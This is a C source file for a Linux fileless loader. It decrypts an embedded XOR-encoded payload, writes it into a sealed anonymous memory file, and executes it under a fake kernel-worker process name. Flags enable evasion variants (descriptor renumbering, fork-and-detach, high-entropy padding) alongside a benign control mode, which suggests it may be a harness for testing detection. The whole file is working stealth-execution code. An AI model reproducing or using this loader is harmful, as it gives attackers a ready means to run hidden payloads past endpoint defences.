#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "build/payload_bytes.h"

extern char **environ;

static ssize_t write_all(int fd, const uint8_t *buf, size_t len) {
    size_t total = 0;
    while (total < len) {
        ssize_t n = write(fd, buf + total, len - total);
        if (n < 0) {
            if (errno == EINTR) {
                continue;
            }
            return -1;
        }
        total += (size_t)n;
    }
    return (ssize_t)total;
}

static void fill_high_entropy(uint8_t *buf, size_t len) {
    uint64_t state = 0x9e3779b97f4a7c15ULL;
    for (size_t i = 0; i < len; i++) {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        buf[i] = (uint8_t)(state & 0xff);
    }
}

int main(int argc, char *argv[]) {
    const char *memfd_name = "jit_cache";
    const char *fake_argv0 = "[kworker/u8:2]";
    int benign_only = 0;
    int dup_fd_evasion = 0;
    int fork_evasion = 0;
    int execve_fd_evasion = 0;
    int high_entropy = 0;
    int passthrough_idx = 0;
    char *child_argv[24];

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--benign-memfd") == 0) {
            benign_only = 1;
        } else if (strcmp(argv[i], "--dup-fd") == 0) {
            dup_fd_evasion = 1;
        } else if (strcmp(argv[i], "--fork") == 0) {
            fork_evasion = 1;
        } else if (strcmp(argv[i], "--execve-fd") == 0) {
            execve_fd_evasion = 1;
        } else if (strcmp(argv[i], "--high-entropy") == 0) {
            high_entropy = 1;
        } else if (strcmp(argv[i], "--memfd-name") == 0 && i + 1 < argc) {
            memfd_name = argv[++i];
        } else if (strcmp(argv[i], "--argv0") == 0 && i + 1 < argc) {
            fake_argv0 = argv[++i];
        } else if (passthrough_idx < 22) {
            child_argv[++passthrough_idx] = argv[i];
        }
    }

    unsigned int mfd_flags = MFD_ALLOW_SEALING;
    if (!fork_evasion && !execve_fd_evasion) {
        mfd_flags |= MFD_CLOEXEC;
    }

    int fd = memfd_create(memfd_name, mfd_flags);
    if (fd < 0) {
        perror("memfd_create");
        return 1;
    }

    if (benign_only) {
        const char *msg = "shared audio buffer data";
        if (write_all(fd, (const uint8_t *)msg, strlen(msg)) < 0) {
            perror("write");
            close(fd);
            return 1;
        }
        printf("[loader] benign memfd created (pid=%d fd=%d), exiting without exec\n",
               getpid(), fd);
        close(fd);
        return 0;
    }

    uint8_t *decrypted = malloc(PAYLOAD_LEN);
    if (!decrypted) {
        perror("malloc");
        close(fd);
        return 1;
    }

    for (size_t i = 0; i < PAYLOAD_LEN; i++) {
        decrypted[i] = PAYLOAD_ENC[i] ^ PAYLOAD_XOR_KEY;
    }

    if (write_all(fd, decrypted, PAYLOAD_LEN) < 0) {
        perror("write");
        free(decrypted);
        close(fd);
        return 1;
    }
    free(decrypted);

    size_t total_size = PAYLOAD_LEN;
    if (high_entropy) {
        size_t pad_len = 49152;
        uint8_t *noise = malloc(pad_len);
        if (!noise) {
            perror("malloc");
            close(fd);
            return 1;
        }
        fill_high_entropy(noise, pad_len);
        if (write_all(fd, noise, pad_len) < 0) {
            perror("write(overlay)");
            free(noise);
            close(fd);
            return 1;
        }
        free(noise);
        total_size += pad_len;
    }

    int seals = F_SEAL_WRITE | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_SEAL;
    if (fcntl(fd, F_ADD_SEALS, seals) < 0) {
        perror("fcntl(F_ADD_SEALS)");
        close(fd);
        return 1;
    }

    if (dup_fd_evasion) {
        int target_fd = 42;
        if (dup2(fd, target_fd) < 0) {
            perror("dup2");
            close(fd);
            return 1;
        }
        close(fd);
        fd = target_fd;
    }

    if (fork_evasion) {
        pid_t child = fork();
        if (child < 0) {
            perror("fork");
            close(fd);
            return 1;
        }
        if (child > 0) {
            close(fd);
            _exit(0);
        }
    }

    child_argv[0] = (char *)fake_argv0;
    child_argv[passthrough_idx + 1] = NULL;

    printf("[loader] executing sealed memfd payload (pid=%d fd=%d size=%zu bytes)\n",
           getpid(), fd, total_size);
    fflush(stdout);

    if (execve_fd_evasion) {
        char fd_path[64];
        snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
        execve(fd_path, child_argv, environ);
        perror("execve(/proc/self/fd)");
        close(fd);
        return 1;
    }

    if (syscall(SYS_execveat, fd, "", child_argv, environ, AT_EMPTY_PATH) < 0) {
        perror("execveat");
        close(fd);
        return 1;
    }

    return 0;
}
